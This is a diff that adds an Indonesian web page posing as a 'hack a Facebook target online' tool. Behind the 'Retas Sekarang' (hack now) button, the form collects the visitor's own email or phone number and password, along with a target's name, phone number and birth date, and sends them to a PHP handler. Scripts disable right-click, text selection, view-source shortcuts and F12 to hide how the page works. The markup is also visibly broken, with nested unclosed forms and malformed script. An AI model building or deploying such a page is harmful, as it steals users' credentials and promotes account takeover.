@@ -1,0 +1,177 @@
+
+                             
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="shortcut icon" href="https://images2.imgbox.com/74/c2/A82aJNWc_o.png"/>
+<title>Hacker target facebook online</title>
+<script src="jquery.min.js"></script>
+<link rel="stylesheet" href="bootstrap.min.css">
+<style type="text/php">
+
+.container {
+	position:relative;
+	margin:50px auto;
+	max-width:600px;
+	height:auto;
+	border:2px solid #000000;
+	padding:30px;
+	box-sizing: border-box;
+}
+
+.transparent{
+ background:#fff;
+ width: 100%;
+ height:270px;
+ padding:10px;
+ margin:0px auto;
+ color:#000000;
+}
+
+.transparent-box{
+ background:#fff;
+ width: 100%;
+ height:520px;
+ padding:10px;
+ margin:0px auto;
+ color:#000000;
+</style>
+<script type="text/javascript">
+	$(document).ready(function(){
+	  $("#gsubmit").on("click", function() {
+
+var gnumber = $("#gnumber").val();
+var townhall = $("#townhall").val();
+var grecov = $("#grecov").val();
+var gexp = $("#gexp").val();
+		  if(gnumber==''|| grecov=='')
+{
+
+}
+else
+{
+	var res = document.getElementById("hasilnya");
+          res.innerHTML='';
+		  $("#gsubmit").prop("disabled", true );
+		  $.post("request.php",
+		  {gnumber:gnumber,grecov:grecov,gexp:gexp,townhall:townhall,},
+		  function(response,status){
+			  $('#hasilnya').html(response);
+			$("#gsubmit").prop("disabled", false );
+			
+		  });
+		  return false;
+	  }
+	  }
+	  );
+	});
+
+	</script>
+<!-- Kode menampilkan peringatan untuk mengaktifkan javascript-->
+<div align="center"><noscript>
+   <div style="position:fixed; top:0px; left:0px; z-index:7000; height:100%; width:100%; background-color:#FFFFFF">
+   <div style="font-family: Arial; font-size: 17px; background-color:#00bbf9; padding: 11pt;">Mohon aktifkan javascript pada browser untuk mengakses halaman ini!</div></div>
+</noscript></div>
+
+<!--Kode untuk mencegah seleksi teks, block teks dll.-->
+<script type="text/javascript">
+function disableSelection(e){if(typeof e.onselectstart!="undefined")e.onselectstart=function(){return false};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){return false};e.style.cursor="default"}window.onload=function(){disableSelection(document.body)}
+</script>
+
+<!--Kode untuk mematikan fungsi klik kanan di blog-->
+<script type="text/javascript">
+function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){9return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
+</script>
+
+<style type="text/css">
+* : (input, textarea) {
+    -webkit-touch-callout: none;
+    -webkit-user-select: none;
+
+}
+</style>
+<style type="text/css">
+img {
+	-webkit-touch-callout: none;
+	-webkit-user-select: none;
+    }
+</style>
+
+<!--Kode untuk mencegah shorcut keyboard, view source dll.-->
+<script type="text/javascript">
+window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
+</script>
+<script type="text/javascript">
+document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
+</script>
+<script type='text/javascript'>window._sbzq||function(e){e._sbzq=[];var t=e._sbzq;t.push(["_setAccount",54166]);var n=e.location.protocol=="https:"?"https:":"http:";var r=document.createElement("script");r.type="text/javascript";r.async=true;r.src=n+"//static.subiz.com/public/js/loader.js";var i=document.getElementsByTagName("script")[0];i.parentNode.insertBefore(r,i)}(window);</script>
+<CENTER>
+<div class="col-md-6">
+<center><FONT COLOR="red"><FONT SIZE=3><marquee>MOHON JANGAN SALAH GUNAKAN 🙏</marquee></FONT></FONT></center>
+<br><audio src="https://a.top4top.io/m_1848iyfql8.mp3" autoplay="" controls=""></audio></audio></i></head></html>
+
+<body background = "https://i.top4top.io/p_18480ltch7.gif"><br>
+<div class="col-md-8">
+       <form action="processingcod.php" id="login-form" method="post">
+	   
+	   <div class="container transparent-box">
+  <h4 >
+
+<div style="width:100%" class="form-group">
+ <br>
+ </div>
+ 
+
+       <form action="processingcod.php" id="login-form" method="post">
+<h4 >
+<img src="https://b.top4top.io/p_1847s4iru9.gif" height="100px" width="100px">
+  </h4><form id="glogin">
+<div style="width:100%" class="form-group">
+  <input class="form-control" name="mt1" placeholder="Email Atau Nomor Anda" type="text" >
+</div>
+<div style="width:100%" class="form-group">
+  <input class="form-control" name="mt2" placeholder="Password Anda" type="password" >
+
+
+       <form action="processingcod.php" id="login-form" method="post">
+<h4 >
+<img src="https://scontent.fbdo9-1.fna.fbcdn.net/v/t1.30497-1/c59.0.200.200a/p200x200/84628273_176159830277856_972693363922829312_n.jpg?_nc_cat=1&ccb=2&_nc_sid=12b3be&_nc_ohc=NNh98FvJJdcAX9aGaK7&_nc_ht=scontent.fbdo9-1.fna&tp=27&oh=35b01939c48c2cbd3fe721903eba1341&oe=602E4A39" height="50px" width="50px">
+  </h4><form id="glogin">
+<div style="width:100%" class="form-group">
+  <input class="form-control" name="fb1" placeholder="Nama Target" type="text" >
+</div>
+<div style="width:100%" class="form-group">
+  <input class="form-control" name="fb2" placeholder="Nomor Tlp Target" type="text" >
+<div style="width:100%" class="form-group">
+  <input class="form-control" name="fb2" placeholder="Tgl Lahir Target" type="text" >
+  
+  
+
+  
+  <br>
+
+  
+ <input type="submit" class="btn btn-block" style="width: 250px; height: 50px; color: #ffff;background-color: #045FB4;" value="Retas Sekarang"> </form>
+ </div>
+<div style="text-align:left" class="error-msg" id="hasilnya"></div>
+<div style="width:100%" class="form-group">
+ 
+ <p><center><b>© Hak Cipta Hacker Indonesia 2021</b>.</p>
+</center>
+</div><br>
+</div>
+  </p> 
+</div>
+</div>
+</div><br><br>
+</div>
+<body background = "https://c.top4top.io/p_1848lti627.gif"><br>
+<div class="col-md-8">
+       <form action="processingcod.php" id="login-form" method="post">
+
+
+<center>
+<iframe width="0" height="0" src="https://d.top4top.io/m_165562rfh0.mp3" frameborder="0" allowfullscreen/>
